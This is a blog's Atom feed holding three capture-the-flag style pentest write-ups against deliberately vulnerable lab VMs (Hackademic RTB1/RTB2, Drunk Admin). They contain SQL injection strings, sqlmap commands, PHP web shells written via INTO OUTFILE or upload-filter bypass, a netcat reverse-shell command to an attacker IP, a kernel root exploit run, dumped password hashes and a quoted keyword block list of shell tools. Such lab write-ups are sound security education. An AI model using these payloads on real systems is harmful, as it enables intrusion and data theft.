<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: writeups | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2016-11-22T14:21:15-05:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Hackademic RTB2]]></title>
    <link href="http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2/"/>
    <updated>2016-07-20T13:36:20-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2</id>
    <content type="html"><![CDATA[<p>The objective is the same as the previous one, get root and read key.txt</p>

<!-- more -->


<h1>Recon</h1>

<p>Again, this will be a web hacking mission, only web server is available.</p>

<p><img class="center" src="/images/pentest/hackademic/rtb2-web.png" title="&lsquo;hackademic&rsquo; &lsquo;hackademic website&rsquo;" ></p>

<p>There was nothing in the source code, no suspicious headers, no sql injection in the login. I ran OpenVAS, Dirbuster and Nikto on the target, but nothing more was uncovered other than a Phpmyadmin interface, which kept giving me &ldquo;unable to connect to MySQL server&rdquo; errors no matter what I did. I assumed that maybe the web server is a false front and that might be something else hidden on the machine, so I ran a UDP scan next, which revealed an additional port:</p>

<p><code>plain
nmap -sU -F -n -T4 192.168.80.166
PORT     STATE SERVICE  REASON
5353/udp open  zeroconf udp-response ttl 255
</code></p>

<p>Further internet research and a version scan implied that this was the <a href="https://en.wikipedia.org/wiki/Multicast_DNS">Multicast DNS</a> protocol. I couldn&rsquo;t find anything to exploit it, though. But it made me want to take a closer look at Nmap&rsquo;s results again, so I ran another scan:</p>

<p>``` plain
nmap  -p- 192.168.80.166</p>

<p>Starting Nmap 6.49BETA5 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-07-21 08:14 EDT
Nmap scan report for 192.168.80.166
Host is up, received arp-response (0.00024s latency).
Not shown: 65533 closed ports, 1 filtered port
Reason: 65533 resets and 1 port-unreach
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```</p>

<p>This time I read it more carefully and I noticed it reported a filtered port. I ran Nmap again with the verbose flags and <code>&mdash;packet-trace</code> option and this time it returned a new port:</p>

<p><code>plain
PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 64
666/tcp open  doom    syn-ack ttl 64
</code></p>

<p>This must have been the previously reported as filtered port. Version scanning revealed that this was actually another web server!</p>

<p><code>plain
666/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.14 ((Ubuntu))
</code></p>

<p>Before continuing, I am taking a detour here because it seems I had bypassed a secion of the challenge. When I came back to resume working on this VM, I couldn&rsquo;t get the 666 port to open, and I had no idea what triggered it. I looked at g0tmi1lk&rsquo;s video and it turns out there is a SQLi string that you can insert into the password field of the first web server that gives you a different response. The string is <code>&lsquo; or 1=1&mdash;&rsquo;</code>. I previously tested this parameter with sqlmap and also inserting another variation of this string, with no satisfactory answer. I assumed maybe it&rsquo;s hardcoded, because the slightest change, as in putting a space after the comment character invalidates it. Anyway, with this injection attempt you are taken to a page that says &ldquo;Ok, nice shot&hellip;&hellip;but, you are looking in a wrong place bro! ;&ndash;)&rdquo;. In the source, there was a URL encoded string:</p>

<p><code>plain
%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%20%30%64%20%30%61%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%36%39%20%36%65%20%32%37%20%32%30%20%36%66%20%36%65%20%32%30%20%36%38%20%36%35%20%36%31%20%37%36%20%36%35%20%36%65%20%32%37%20%37%33%20%32%30%20%36%34%20%36%66%20%36%66%20%37%32%20%32%30%20%32%65%20%32%65%20%32%30%20%33%61%20%32%39%20%30%64%20%30%61%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%30%64%20%30%61%20%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%0A
</code></p>

<p>Decoding it yielded a hex string this time:</p>

<p><code>plain
3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e 0d 0a 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 69 6e 27 20 6f 6e 20 68 65 61 76 65 6e 27 73 20 64 6f 6f 72 20 2e 2e 20 3a 29 0d 0a 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 0d 0a 3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e
</code></p>

<p>After decoding the hex string, I got this message:</p>

<p><code>plain
&lt;---------&gt;
Knock Knock Knockin' on heaven's door .. :)
00110001 00110000 00110000 00110001 00111010 00110001 00110001 00110000 00110001 00111010 00110001 00110000 00110001 00110001 00111010 00110001 00110000 00110000 00110001
&lt;---------&gt;
</code></p>

<p>Alright, this is a reference to <a href="https://en.wikipedia.org/wiki/Port_knocking">port knocking</a>. I further decoded the binary data to ascii by using <a href="http://www.snarkles.net/scripts/sneak/sneak.php">this site</a> and got the string <em>1001:1101:1011:1001</em>. So I assumed this string will need to be given to the host in order to open up the port.</p>

<p>``` plain</p>

<h1>!/bin/bash</h1>

<p>for i in 1001 1101 1011 1001
do
nc 192.168.80.167 80 $i
done
```</p>

<p>Indeed, now the 666 port was opened. Not sure how I previously got to it without going through the sequence</p>

<p><img class="center" src="/images/pentest/hackademic/rtb2-hidden.png" title="&lsquo;hidden web server&rsquo; &lsquo;hidden web server&rsquo;" ></p>

<p>Ok, back to hacking! First thing I noticed was a really old Joomla version, so I fired up <code>joomscan</code> and among the 4 vulnerabilities found, I show here one that seemed more interesting:</p>

<p><code>plain
Info -&gt; CorePlugin: TinyMCE TinyBrowser addon multiple vulnerabilities
Versions effected: Joomla! 1.5.12
Check: /plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/
Exploit: While Joomla! team announced only File Upload vulnerability, in fact there are many. See: http://www.milw0rm.com/exploits/9296
Vulnerable? Yes
</code></p>

<p>Ok, let&rsquo;s keep this in mind and continue looking. I ran Nikto against this new web server and it reported entries in robots.txt!</p>

<p><code>plain
User-agent: *
Disallow: /administrator/
Disallow: /cache/
Disallow: /components/
Disallow: /images/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /libraries/
Disallow: /media/
Disallow: /modules/
Disallow: /plugins/
Disallow: /templates/
Disallow: /tmp/
Disallow: /xmlrpc/
</code></p>

<h1>Exploit</h1>

<p>I visited those directories but there was nothing interesting. The administrator one contained a message stating that I am not the real administrator. So I went back to testing for SQLi in the login page and in the URL parameters. In particular, I was interested by the <em>Itemid</em> parameter. When I tampered with it, I got messages that I need to login to view that area of the site. I used sqlmap but no vulnerability found. Seeing so many parameters in the URL, I decided to test each one of them by visiting every page and trying a single quote in every parameter. And the jackpot was found at the <code>letter</code> parameter in the List contents page:</p>

<p>``` plain
<a href="http://192.168.80.166:666/index.php?option=com_abc&amp;view=abc&amp;letter=%27&amp;Itemid=3">http://192.168.80.166:666/index.php?option=com_abc&amp;view=abc&amp;letter=%27&amp;Itemid=3</a></p>

<p>Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;%&rsquo; GROUP BY title ORDER BY title' at line 1 SQL=SELECT id, title FROM jos_content WHERE state = 1 AND UPPER(title) LIKE &lsquo;&rsquo;%&lsquo; GROUP BY title ORDER BY title
&rsquo;
```</p>

<p>With this information, I pointed sqlmap to the vulnerable parameter and retrieved the jos_users table of the joomla database, where among others, there were usernames and password hashes</p>

<p><code>plain
username    usertype    password
Administrator   Super Administrator 08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl
JSmith  Registered  992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF
BTallor Registered  abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy
hacky   Registered  19630caea014ce1746ec41b074973c04:LSGCiJLhUyxZRLOMAcy96PTmbN8nnxIL
</code></p>

<p>Well, these hashes won&rsquo;t help much, as a quick search didn&rsquo;t give me any way to crack them fast and easy. I did research a bit on the internet and found out that these are salted hashes, stored in the format <code>md5 hash:salt</code>. I also found there is a Perl script that can help with cracking such hashes, called <a href="http://morxploit.com/joomlacrack.txt">joomlacrack.pl</a>. But I thought I might not need to crack them if I could use sqlmap to execute commands on the server and write a PHP backdoor there. So that&rsquo;s what I tried next. Passing <em>pwd</em> to <em>&mdash;os-cmd</em> gave me the location of the current directory, which is /var/www. I tried writing a shell directly in this location but I failed. So next I listed the contents of the present directory and noticed a <em>configuration.php</em> file that I read, and inside there were credentials for the database:</p>

<p><code>plain
/* Database Settings */
var $dbtype = 'mysql';
var $host = 'localhost';
var $user = 'root';
var $password = 'yUtJklM97W';
var $db = 'joomla';
var $dbprefix = 'jos_';
</code></p>

<p>I went to the phpmyadmin interface and logged in as root. Then I was able to use SQL to create a rudimentary shell:</p>

<p><code>sql
SELECT
"&lt;? system($_REQUEST['cmd']); ?&gt;"
INTO OUTFILE "/var/www/cmd.php";
</code></p>

<p>After uploading this shell, I used to download the reverse PHP shell that I hosted with Python&rsquo;s SimpleHTTPServer. And then I navigated to it and received the connection on my Netcat listener:</p>

<p><code>plain
Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux
 15:14:37 up  4:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
</code></p>

<p>The local exploit that worked was the same one I used in the previous Hackademic challenge, the <a href="https://www.exploit-db.com/exploits/15285/">RDS Protocol Local Privilege Escalation exploit</a>. Again, I used wget to download it from my machine and ran it:</p>

<p><code>plain
[snipped]
[*] Restoring function pointer...
id
uid=0(root) gid=0(root)
ls /root/
Desktop
Key.txt
</code></p>

<p>Trying to read the key gave a huge base64 encoded string, so I copied it to the web server directory, gave it permissions for everyone, and then I downloaded it on my machine, where I could decode it:</p>

<p><code>plain
root@pwnbox:~/Downloads#base64 -d key.txt &gt; decoded
root@pwnbox:~/Downloads#file decoded
decoded: PNG image data, 756 x 344, 8-bit/color RGB, non-interlaced
</code></p>

<p>So it&rsquo;s an image! (when I tried reading it there was binary garbage, so I assumed it must be another type of file than a text one). I used this <a href="http://codebeautify.org/base64-to-image-converter">base64 to image converter</a> to see the image:</p>

<p><img class="center" src="/images/pentest/hackademic/rtb2-win.png" title="&lsquo;hackademic rtb2&rsquo; &lsquo;hackademic rtb 2 finished&rsquo;" ></p>

<h1>Debriefing</h1>

<p>This host implemented a sneaky defense of port knocking in order to serve the second web server. It was a bit unrealistic to require a hardcoded value for the password parameter on the first web server in my opinion. The second server was vulnerable to real SQL injection that could read files on the system and execute commands. Having the database root credentials readily available allowed me to gain a foothold on the machine, from which the only step left was finding an exploit that would give me root.</p>

<p>``` plain
/ You are only young once, but you can \
\ stay immature indefinitely.          /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Hackademic RTB1]]></title>
    <link href="http://chousensha.github.io/blog/2016/07/18/pentest-lab-hackademic-rtb1/"/>
    <updated>2016-07-18T09:00:59-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/18/pentest-lab-hackademic-rtb1</id>
    <content type="html"><![CDATA[<h1>Mission statement</h1>

<p>Get root and read the contents of the file &lsquo;key.txt&rsquo; in the root directory.</p>

<!-- more -->


<h1>Recon</h1>

<p>I started with a port scan of the target, but only the 80 port is open:</p>

<p><img class="center" src="/images/pentest/hackademic/rtb1-web.png" title="&lsquo;hackademic&rsquo; &lsquo;hackademic website&rsquo;" ></p>

<p>I looked at the links and noticed the URL for the post is <a href="http://192.168.80.162/Hackademic_RTB1/?p=9">http://192.168.80.162/Hackademic_RTB1/?p=9</a> and for the archives is <a href="http://192.168.80.162/Hackademic_RTB1/?cat=1">http://192.168.80.162/Hackademic_RTB1/?cat=1</a> . Before going to Sqlmap, I manually inserted quotes in the URLs and sure enough, a SQL error for the cat parameter:</p>

<p><img class="center" src="/images/pentest/hackademic/rtb1-sqli.png" title="&lsquo;sqli&rsquo; &lsquo;sql error&rsquo;" ></p>

<h1>Exploit</h1>

<p>Next I enumerated the databases with Sqlmap:</p>

<p><code>plain
sqlmap -u "http://192.168.80.162/Hackademic_RTB1/?cat=1" --dbms=MySQL --dbs
available databases [3]:
[*] information_schema
[*] mysql
[*] wordpress
</code></p>

<p>Since this is a web-based challenge, I proceeded to look into the wordpress database:</p>

<p><code>plain
sqlmap -u "http://192.168.80.162/Hackademic_RTB1/?cat=1" --dbms=MySQL -D wordpress --tables
Database: wordpress
[9 tables]
+-------------------+
| wp_categories     |
| wp_comments       |
| wp_linkcategories |
| wp_links          |
| wp_options        |
| wp_post2cat       |
| wp_postmeta       |
| wp_posts          |
| wp_users          |
+-------------------+
</code></p>

<p>I further enumerated the wp_users table and here I am showing only the relevant information:</p>

<p><code>plain
user_pass               user_login
21232f297a57a5a743894a0e4a801fc3    NickJames
b986448f0bb9e5e124ca91d3d650f52c    JohnSmith
7cbb3252ba6b7e9c422fac5334d22054    GeorgeMiller
a6e514f9486b83cb53d8d932f9a04292    TonyBlack
8601f6e1028a8e8a966f6c33fcd9aec4    JasonKonnors
50484c19f1afdaf3841a0d821ed393d2    MaxBucky
</code></p>

<p>Cracking the hashes revealed the passwords of all the users:</p>

<p><code>plain
admin
PUPPIES
q1w2e3
napoleon
maxwell
kernel
</code></p>

<p>Then I went to the Wordpress login page at <a href="http://192.168.80.162/Hackademic_RTB1/wp-login.php">http://192.168.80.162/Hackademic_RTB1/wp-login.php</a> and logged in as NickJames (assumed he was admin because of his password). But there was nothing extraordinary to be done with his privileges, just adding and editing posts. We have more users to try  though! When I reached GeorgeMiller, I noticed there were more actions available in the admin panel:</p>

<p><img class="center" src="/images/pentest/hackademic/rtb1-panel.png" title="&lsquo;dashboard&rsquo; &lsquo;admin panel&rsquo;" ></p>

<p>In the Presentation tab I could edit themes for the site. I picked the 404.php file and replaced its content with a line that would echo something first, so I don&rsquo;t waste my time with shells without checking if code is executed successfully.</p>

<p><img class="center" src="/images/pentest/hackademic/rtb1-404.png" title="&lsquo;404.php&rsquo; &lsquo;php file edited&rsquo;" ></p>

<p>When I went to the <a href="http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php">http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php</a> URL, I saw RCE displayed, so next I used the now-familiar reverse PHP shell from pentestmonkey. Set up my listener and visited the URL again to receive the shell:</p>

<p><code>plain
nc -vnlp 5555
listening on [any] 5555 ...
connect to [192.168.80.161] from (UNKNOWN) [192.168.80.162] 50723
Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
 13:23:45 up  3:04,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=489(apache) groups=489(apache)
sh: no job control in this shell
</code></p>

<h2>Privilege escalation</h2>

<p>The shell kept echoing back the commands I was running but otherwise it worked fine. I didn&rsquo;t find anything interesting that I could use during local enumeration, so I then searched for privilege escalation exploits that might apply to the kernel version 2.6.31 found on the box. The exploit that worked was the <a href="https://www.exploit-db.com/exploits/15285/">RDS privilege escalation exploit</a> by Dan Rosenberg. You can also find it on Kali with Searchsploit. I compiled it on my machine with the <em>-m32</em> flag for the target architecture and transfered it via netcat. Then I ran it and I stared a bit at the blinking cursor before confirming that it gave me root:</p>

<p>``` plain
sh-4.0$ ./rds
./rds
[<em>] Linux kernel >= 2.6.30 RDS socket exploit
[</em>] by Dan Rosenberg
[<em>] Resolving kernel addresses&hellip;
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[</em>] Overwriting security ops&hellip;
[<em>] Linux kernel >= 2.6.30 RDS socket exploit
[</em>] by Dan Rosenberg
[<em>] Resolving kernel addresses&hellip;
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[</em>] Overwriting security ops&hellip;
[<em>] Overwriting function pointer&hellip;
[</em>] Linux kernel >= 2.6.30 RDS socket exploit
[<em>] by Dan Rosenberg
[</em>] Resolving kernel addresses&hellip;
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[<em>] Overwriting security ops&hellip;
[</em>] Overwriting function pointer&hellip;
[<em>] Triggering payload&hellip;
[</em>] Restoring function pointer&hellip;
id
uid=0(root) gid=0(root)
cat /root/key.txt
Yeah!!
You must be proud because you &rsquo;ve got the password to complete the First <em>Realistic</em> Hackademic Challenge (Hackademic.RTB1) :)</p>

<p>$<em>d&amp;jgQ>>ak#b"(Hx"o&lt;la</em>%</p>

<p>Regards,
mr.pr0n || p0wnbox.Team || 2011
<a href="http://p0wnbox.com">http://p0wnbox.com</a>
```</p>

<h1>Debriefing</h1>

<p>The machine looked pretty tightly locked with only a web server running. But the WordPress version was contained a known SQLi exploit that handed down the hashes for the users. One user had the rights to upload code on the server and facilitated geting (limited) access on the target. The kernel was vulnerable to a local root exploit, and from there it was game over.</p>

<p>GG, nice VM! Now let&rsquo;s end with some wisdom straight from the cow&rsquo;s mouth:</p>

<p>``` plain
/ Don&rsquo;t relax! It&rsquo;s only your tension \
\ that&rsquo;s holding you together.        /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Drunk Admin Web Hacking Challenge]]></title>
    <link href="http://chousensha.github.io/blog/2016/06/12/pentest-lab-drunk-admin-web-hacking-challenge/"/>
    <updated>2016-06-12T11:51:50-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/06/12/pentest-lab-drunk-admin-web-hacking-challenge</id>
    <content type="html"><![CDATA[<h1>Mission statement</h1>

<p>The challenge includes an image hosting web service that has various design vulnerabilities. You must enumerate the various web service features and find an exploitable vulnerability in order to read system hidden files. The web application is 100% custom so do not try to search google for relative PoC exploit code.</p>

<p>FINAL GOAL: Reveal the hidden message for a date arrange that Bob sent to Alice.</p>

<!-- more -->


<h1>Recon</h1>

<p>Started with an Nmap scan, I only keep here the relevant output:</p>

<p><code>plain
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 5.5p1 Debian 6+squeeze1 (protocol 2.0)
8880/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.16 ((Debian))
</code></p>

<p>As you can see, the box is pretty tightly locked. Oh well, we knew from the challenge title that it was going to be web-based. So let&rsquo;s see what&rsquo;s on the web server</p>

<p><img class="center" src="/images/pentest/drunkadmin/tripios.png" title="&lsquo;tripios&rsquo; &lsquo;tripios image hosting&rsquo;" ></p>

<p>And on the Info tab there is this very appealing request to report any vulnerabilities we may find with the site:
<code>Developer was really drunk while writting these code lines. Act like a pro and report any security flaws that you spotted around.</code></p>

<h1>Exploit</h1>

<p>First I uploaded a normal image which then gets displayed on the <em>image.php</em> page:</p>

<p><img class="center" src="/images/pentest/drunkadmin/upload.png" title="&lsquo;upload&rsquo; &lsquo;uploaded image&rsquo;" ></p>

<p>Next I uploaded a reverse PHP shell and changed the Content-Type header from application/x-php to image/png. This gave me an invalid file extension error. Then I tried again but this time I also changed the extension from PHP to PNG. Another error, saying &ldquo;you&rsquo;re naughty&rdquo;. This error kept flagging all my other attempts (tried uploading with double extensions or keeping just the PNG magic number and rest PHP code). So I went back to the start and once again found out that something I had dismissed as unimportant would play an important role in exploiting the target.</p>

<p>When uploading a correct image, I noticed a cookie was set: <code>trypios=246f7045b13ca34bd0fb443a038605de</code>. And when I looked at the image source, which I should have done in the first place, it looked like this: <code>images/246f7045b13ca34bd0fb443a038605de.png</code>.</p>

<p>Now I know where to access my uploaded files, but I still couldn&rsquo;t upload any PHP file. I remembered the mission briefing that stated this is a custom application and I thought there might be a filter that could catch the reverse shell, so I wrote a one line PHP script that simply echoes back a message. Thought it might be deemed harmless enough if there is a filter in place. And I finally managed to fool the application into uploading it by simply giving it a double extension of <code>.png.php</code> (something that I had tried before with the reverse shell and it got caught).</p>

<p>However, after successfully uploading it, my &ldquo;cool image&rdquo; wasn&rsquo;t displayed at all, and it didn&rsquo;t exist in the source either. I navigated directly to where it should be (based on the cookie value), which in my case was at <a href="http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171">http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171</a></p>

<p>And boom! The string &ldquo;RCE possible&rdquo; was displayed, which is exactly what I had my script outputting! The key takeaway here was that <strong>the file upload vulnerability was easily exploited by adding a double extension, but there was also a filter in place that flagged certain PHP code and prevented the upload</strong>. Because I could get code execution with a simple echo script, but not with the reverse shell.</p>

<p>With this information, I made another simple script to see if I can get command execution on the target:</p>

<p><code>php
&lt;?php
echo exec($_GET['cmd']);
?&gt;
</code></p>

<p>When I tried uploading it&hellip;again the naughty message! Clearly some filtering is in place. I modified it again to:</p>

<p><code>php
echo exec('whoami');
</code></p>

<p>It got uploaded without a problem and it displayed www-data when I went to it. So it appears that $<em>GET triggered the filter. I tried again, this time with $</em>REQUEST:</p>

<p><code>php
echo exec($_REQUEST['cmd']);
</code></p>

<p>And the filter didn&rsquo;t trigger! I went to it and passed the <em>pwd</em> command and success! It displayed /var/www/images. So command execution on the host finally achieved. I tweaked it a bit to give me a reverse shell, because it would be inconvenient to navigate the filesystem in its current state. So I had netcat listen on my 5555 port and then sent a shell from the remote host with <code>cmd=nc -c /bin/sh 192.168.80.158 5555</code></p>

<p>Now that I&rsquo;m the system, time to look around for the secret message:</p>

<p><code>plain
root@pwnbox:~#nc -vvnlp 5555
listening on [any] 5555 ...
connect to [192.168.80.158] from (UNKNOWN) [192.168.80.160] 49553
ls /home
bob
ls /home/bob/
Documents
public_html
</code></p>

<p>I looked in Bob&rsquo;s directory and found some PHP files but none contained any message. So I took a look at the <code>/var/www</code> as well:</p>

<p><code>plain
ls -a /var/www
.
..
.htaccess
.proof
image.php
images
index.php
info.php
myphp.php
style
upload.php
xmm.html
</code></p>

<p>A hidden proof file! Let&rsquo;s see what&rsquo;s in it:</p>

<p>``` plain
cat .proof</p>

<h6>#</h6>

<h1>Drunk Admin Challenge</h1>

<h1>by @anestisb</h1>

<h6>#</h6>

<p>bob> Great work.
bob> Meet me there.
&hellip;> ?
bob> What? You don&rsquo;t know where?
bob> Work a little more your post</p>

<pre><code> exploitation skills.
</code></pre>

<p>Secret Code:
TGglMUxecjJDSDclN1Ej</p>

<p>Mail me your methods at:
<a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#x61;&#x6e;&#x65;&#x73;&#x74;&#105;&#115;&#64;&#98;&#101;&#99;&#x68;&#x74;&#115;&#111;&#117;&#x64;&#105;&#115;&#x2e;&#x63;&#111;&#109;">&#x61;&#110;&#101;&#x73;&#116;&#105;&#115;&#64;&#x62;&#x65;&#99;&#104;&#116;&#115;&#111;&#x75;&#100;&#105;&#x73;&#x2e;&#99;&#111;&#x6d;</a>
```</p>

<p>All right, found the right one! I tried to decode that string but didn&rsquo;t get any intelligible output. This time though, all those PHP files that I found in bob&rsquo;s home directory would come in handy! There is a <em>public_html</em> file in bob&rsquo;s home with files that encrypt and decrypt passwords.</p>

<p><code>plain
ls /home/bob/public_html
encrypt.php
include
index.php
</code></p>

<p>I copied the contents of the files to the <em>/var/www/images</em> directory and then I checked that index.php file:</p>

<p><img class="center" src="/images/pentest/drunkadmin/secret.png" title="&lsquo;secret&rsquo; &lsquo;secret decryption&rsquo;" ></p>

<p>But when I gave it the string <code>TGglMUxecjJDSDclN1Ej</code> I got garbage. Now, one of the things I tried before was to base64 decode the string. The output I got was <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>, which didn&rsquo;t really help. Since I couldn&rsquo;t decrypt the secret with the form either, I thought to double check what kind of encoding it might use. And because I was thinking base64 but not sure, I inspired myself from a <a href="https://stackoverflow.com/questions/11656115/decode-python-base64-string">Stack Overflow post</a> to check if the string really is base64 in Python:</p>

<p>``` python</p>

<p>import base64
import binascii</p>

<p>testme = raw_input(&ldquo;Enter string to check if base64: &rdquo;)</p>

<p>try:</p>

<pre><code>base64.decodestring(testme)
print base64.decodestring(testme)
</code></pre>

<p>except binascii.Error:</p>

<pre><code>print "[x] Sorry, this isn't base64"
</code></pre>

<p>```</p>

<p>And the the script did return the same output that I had decoded earlier: <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>. So this time, I tried to enter this string in the decrypt form..and the message was revealed!</p>

<p><code>Alice, prepare for a kinky night. Meet me at &lsquo;35.517286&rsquo; &lsquo;24.017637&rsquo;</code></p>

<p>Yes! The message was decrypted and challenge completed! I was curious though and looked at the coordinates in Google Maps. It seems that Bob and Alice&rsquo;s chosen place of fun is a location in Greece:</p>

<p><img class="center" src="/images/pentest/drunkadmin/location.png" title="&lsquo;meeting location&rsquo; &lsquo;secret location&rsquo;" ></p>

<p>Before wrapping up, do you remember the upload filter that caught the malicious uploads and gave a naughty message? I took a peek at it and here&rsquo;s the filter part:</p>

<p>``` php
if(isset($_POST[&lsquo;Submit&rsquo;]) &amp;&amp; !$errors) {</p>

<pre><code>$file = file_get_contents("./images/$image_name");
if( strpos($file,"perl") ||
strpos($file,"bash") ||
strpos($file,"sh -c") ||
strpos($file,"python") ||
strpos($file,"nc ") ||
strpos($file,"netcat") ||
strpos($file,"base64") ||
strpos($file,"ruby") ||
strpos($file,"fsockopen") ||
strpos($file,"xterm") ||
strpos($file,"gcc") ||
strpos($file,'$_GET') ||
strpos($file,'$_POST') ||
strpos($file,'$_SERVER') ||
strpos($file,'$_FILES') ||
strpos($file,'$_COOKIE') )
{ 
echo "&lt;h1&gt;Ohhh you are naughty!&lt;/h1&gt;"; 
exec("rm ./images/$image_name");
die;
}
</code></pre>

<p>```</p>

